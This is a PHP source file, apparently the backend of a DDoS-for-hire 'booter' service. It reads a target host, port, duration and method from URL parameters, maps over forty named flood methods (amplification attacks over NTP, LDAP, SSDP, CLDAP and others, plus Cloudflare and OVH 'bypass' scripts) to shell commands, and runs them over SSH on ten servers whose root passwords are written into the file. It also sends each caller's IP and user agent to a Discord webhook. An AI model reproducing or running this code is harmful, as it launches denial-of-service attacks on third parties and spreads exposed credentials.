 <?php
/////////////////////////////////
//--     Venux API Script - Modified by Aggron    --//
/////////////////////////////////
ignore_user_abort(true);
set_time_limit(1);
//////////////////////////////////////////
//--    You're servers credentials    --//
//-- Enter you're servers credentials --//
//////////////////////////////////////////
$apis = [
  
        "1" =>[
       "ip"    => "89.32.41.201",
  "username" => "root",
  "password" => "ashtree34",
  ],
  
        "2" =>[
       "ip"    => "89.32.41.209",
  "username" => "root",
  "password" => "ashtree34",
  ],
  
        "3" =>[
       "ip"    => "89.32.41.210",
  "username" => "root",
  "password" => "ashtree34",
  ],
  
        "4" =>[
       "ip"    => "85.204.116.28",
  "username" => "root",
  "password" => "ashtree34",
  ],
  
        "5" =>[
       "ip"    => "86.104.194.167",
  "username" => "root",
  "password" => "ashtree34",
  ],
  
        "6" =>[
       "ip"    => "23.254.226.200",
  "username" => "root",
  "password" => "ashtree34",
  ],
  
        "7" =>[
       "ip"    => "85.204.116.249",
  "username" => "root",
  "password" => "ashtree34",
  ],
  
        "8" =>[
       "ip"    => "85.204.116.25",
  "username" => "root",
  "password" => "ashtree34",
  ],
  
        "9" =>[
       "ip"    => "85.204.116.32",
  "username" => "root",
  "password" => "ashtree34",
  ],
  
        "10" =>[
       "ip"    => "85.204.116.48",
  "username" => "root",
  "password" => "ashtree34",
  ],
          ];
/////////////////////////////////////////
//-- Gets the value of each variable --//
/////////////////////////////////////////
$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$action = $_GET['action'];

///////////////////////////////////////////////////
//-- array of implemented method as a variable --//
///////////////////////////////////////////////////
$array = array("RAND", "SOCKETS", "UDP-FRAG", "FN-FREEZE", "LDAP", "UDPB", "STUN", "UDPMIX", "CLDAP", "CHARGEN", "HOME-FUCK", "XSSHEX", "CLOUDFLARE", "SSDP", "UDP", "SNMP", "HOME-UDP", "TCP", "NTP", "DNS", "XMAS", "SYN", "DNS", "WOLF-DNS", "STD", "LDAP-C", "RAINBOW-LAG", "RUSSIA-DOWN", "SERVER", "KILLALLV2", "REDSYN", "SAS-CRASH", "SYN", "KILLALL", "", "NFO-TCP", "SNMAP", "SMTP-LAG", "OVH-DEDI", "NETBIOS", "OVH-TCP", "OVH-WEAK", "RAINBOW-FREEZE", "NFO-UDP", "OVH-UDP", "STOP", "stop");// Add you're existing methods here, and delete you're none existent methods.
$ray = array("Freshy");

////////////////////////////////////////
//-- Checks if the API key is empty --//
////////////////////////////////////////
if (!empty($key)){
}else{
die('Error: API key is empty!');}

//////////////////////////////////////////
//-- Checks if the API key is correct --//
//////////////////////////////////////////
if (in_array($key, $ray)){ //Change "key" to what ever yo want you're API key to be.
}else{
die('Error: Incorrect API key!');}

/////////////////////////////////
//-- Checks if time is empty --//
/////////////////////////////////
if (!empty($time)){
}else{
die('Error: time is empty!');}

/////////////////////////////////
//-- Checks if host is empty --//
/////////////////////////////////
if (!empty($host)){
}else{
die('Error: Host is empty!');}
///////////////////////////////////
//-- Checks if method is empty --//
///////////////////////////////////
if (!empty($method)){
}else{
die('Error: Method is empty!');}

///////////////////////////////////
//-- Checks if method is empty --//
///////////////////////////////////
if (in_array($method, $array)){
}else{
die('Error: The method you requested does not exist!');}
///////////////////////////////////////////////////
//-- Uses regex to see if the Port could exist --//
///////////////////////////////////////////////////
if ($port > 655000){
die('Error: Ports over 6550000 do not exist');}

//////////////////////////////////
//-- Sets a Maximum boot time --//
//////////////////////////////////
if ($time > 1200){
die('Error: Cannot exceed 120 seconds bitch!');} //Change 10 to the time you used above.

if(ctype_digit($Time)){
die('Error: Time is not in numeric form!');}

if(ctype_digit($Port)){
die('Error: Port is not in numeric form!');}

//////////////////////////////////////////////////////////////////////////////
//--                        You're attack methods                         --//
//-- Make sure the command is formatted correctly for each method you add --//
//////////////////////////////////////////////////////////////////////////////
if ($method == "RAND") { $command = "node /root/rand.js $host $time"; }
if ($method == "RUSSIA-DOWN") { $command = "/root/./RUSSIA-DOWN $host  $port 1024 $time"; }
if ($method == "SOCKETS") { $command = "node /root/CFSockets.js $host $time"; }
if ($method == "CLOUDFLARE") { $command = "node /root/CFBypass.js $host $time"; }
if ($method == "CHARGEN") { $command = "/root/./chargen  $host  $port chargen.txt 2 -1 $time"; }
if ($method == "CLDAP") { $command = "/root/./cldap $host  $port cldap.txt 1 -1 $time"; }
if ($method == "UDPMIX") { $command = "/root/./UDPMIX $host $port $time"; }
if ($method == "UDP") { $command = "/root/./stormudp -d $host -p $port -z 150 -t $time"; }
if ($method == "UDP-FRAG") { $command = "perl /root/blood.pl $host $port 65500 $time"; }
if ($method == "UDPRAPE") { $command = "/root/./udprape $host  $port 1024 1 -1 $time"; } 
if ($method == "HOME-FUCK") { $command = " /root/./HOME-DOWN $host  $port home.txt 4 -1 $time"; }
if ($method == "DNS") { $command = "perl /root/DNSDROP.pl $host $port 1024 $time"; }
if ($method == "LDAP") { $command = "/root/./ldapv3 $host  $port ldap.txt 3 -1 $time"; }
if ($method == "LDAP-C") { $command = "/root/./TNXLBYPASS -T -U -I -h  $host  $port -t $time"; } 
if ($method == "REDSYN") { $command = "/root/./redsyn  $host  $port  2 -1 $time"; }
if ($method == "XSSHEX") { $command =  "/root/./xsshex $host $port 65500 $time"; }
if ($method == "OVH-DEDI") { $command = "/root/./ovhdediv2  $host  $port ovhdediv2.txt 2 -1 $time"; } 
if ($method == "OVH-TCP") { $command = "screen -dmS OVH-TCP /root/./ovh-tcp $host $port 2 -1 $time";; }
if ($method == "100UP") { $command = "/root/./100ip $host  $port 715 $time"; }
if ($method == "OVH-UDP") { $command = "/root/./ovhudp $host $port 501 2 -1 $time";; }
if ($method == "IPMI") { $command = "/root/./ipmi $host 2 -1 $time"; } 
if ($method == "TCP") { $command = "/root/./tcp $host  $port 2 -1 $time"; } 
if ($method == "NTP") { $command = "/root/./ntp $host $port ntp.txt 4 -1 $time"; } 
if ($method == "KILLALL") { $command = "/root/./killallv3 $host -p $port -z 100 -t $time"; }
if ($method == "KILLALLV2") { $command = "/root/./killallv2 $host $port 1 -1 $time all"; }
if ($method == "SYN") { $command = "/root/./synamp $host $port syn.txt 1 -1 $time"; }
if ($method == "SSDP") { $command = "/root/./ssdp  $host  $port ssdp5.txt 1 -1 $time"; }
if ($method == "STD") { $command = "/root/./std $host $port std_amp1.txt 2 -1 $time"; }
if ($method == "SNMP") { $command = "/root/./SNMP  $host  $port snmp.txt 1 -1 $time"; }
if ($method == "STUN") { $command = "/root/./stun  $host  $port stun5.txt 2 -1 $time"; }
if ($method == "SAS-CRASH") { $command = "./SAS-CRASH $host   $port 715 2 -1  $time  "; }
if ($method == "FN-FREEZE") { $command = "/root/./R6-FREEZE  $host  $port r6.txt 2 -1 $time"; }
if ($method == "stop") { $command = "pkill $host -f"; }
if ($method == "STOP") { $command = "pkill $host -f"; }
///////////////////////////////////////////////////////
//-- Check to see if the server has SSH2 installed --//
///////////////////////////////////////////////////////
$i = 0;
foreach ($apis as $api) {
  $i++;
    if(!($con = ssh2_connect($api["ip"], 22))){

      array_push($OUTPUT, [
        "server" => $i,
        "status" => "CONECTION FAILED"
      ]);
        echo json_encode($OUTPUT);
      } else {
          if(!ssh2_auth_password($con, $api["username"], $api["password"])) {
            array_push($OUTPUT, [
              "server" => $i,
              "status" => "INCORECT SERVER LOGIN"
            ]);
          } else {
          
              if (!($stream = ssh2_exec($con, $command ))) {
                array_push($OUTPUT, [
                  "server" => $i,
                  "status" => "Error: You're server was not able to execute you're methods file and or its dependencies"
                ]);

              } else {    
                  stream_set_blocking($stream, false);
                  $data = "";
                  while ($buf = fread($stream,4096)) {
                      $data .= $buf;
                  }
                  array_push($OUTPUT, [
                    "server" => $i,
                    "status" => "<br>hitting: $host using $method for $time"
                  ]);
                  fclose($stream);
              }
          }
      }
$webhookurl = "https://discord.com/api/webhooks/767247614630166529/H0a05GhsPaDscqvGkX5O6Pb97b69VR-XS9B6sWL1tbtPYbanRStWW1162zBymg4wOhSf";
$ip = $_SERVER['REMOTE_ADDR'];
$page = $_SERVER['REQUEST_URI'];
$refer = $_SERVER['HTTP_REFERER'];
$date_time = date("l j F Y  g:ia", time() - date("Z")) ;
$agent = $_SERVER['HTTP_USER_AGENT'];
$barre = str_repeat("#",15);

$msg = " **IP:** $ip\n **PAGE:** $page\n **REFER:** $refer\n **DATE:** $date_time\n **USER-AGENT:** $agent**\n $barre";

$json_data = array ('content'=>"$msg");
$make_json = json_encode($json_data);

$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );

}
?>